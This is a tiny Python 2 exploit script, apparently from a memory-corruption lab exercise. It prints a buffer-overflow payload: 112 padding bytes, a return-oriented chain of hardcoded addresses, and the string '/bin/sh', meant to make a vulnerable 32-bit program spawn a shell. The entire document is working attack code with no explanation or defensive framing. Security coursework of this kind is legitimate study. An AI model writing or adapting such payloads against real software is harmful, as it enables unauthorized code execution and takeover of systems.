from shellcode import shellcode
from struct import pack

#ebp = 0xbffe8f08



print '\xaa'*112 + pack("<I",0x0805df60) + pack("<I",0x080573c0) + pack("<I",0xbffe8f34) + pack("<I",0xbffe8f30) + pack("<I",0xbffe8f38) + pack("<I",0x0808e58d) + pack("<I",0x0807c532) + '\xaa'*4 + pack("<I",0x08057b40) + pack("<I",0xbffe8f38) + '\xff'*4 + "/bin/sh"
